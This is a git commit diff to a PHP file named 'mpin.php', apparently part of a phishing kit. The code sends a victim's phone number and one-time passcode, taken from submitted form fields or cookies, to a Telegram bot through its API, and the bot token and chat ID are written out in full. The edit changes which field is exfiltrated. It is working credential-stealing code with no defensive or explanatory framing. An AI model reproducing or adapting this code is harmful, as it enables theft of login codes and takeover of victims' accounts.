8f4ac41f80913a42fe946f55a2b101cb979b7ed2
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-12-09 18:27:41 +0700

    Update mpin.php

--- mpin.php
+++ mpin.php
@@ -5,12 +5,12 @@ file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmH
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=" . $_COOKIE['number'] . " OTP: " . $_POST['otp']);
 
 
-//$otp = "\nOTP: " . $_POST['otp'];
+//$otp = "\nOTP: " . $_POST['otp']; //COOKIE
 $otp = NULL;
 
 $data = [
 'chat_id' => $Chat_ID,
-'text' => "Number: " . $_COOKIE['number'] . $otp
+'text' => "Number: " . $_POST['number'] . $otp
 ];
 file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));
 
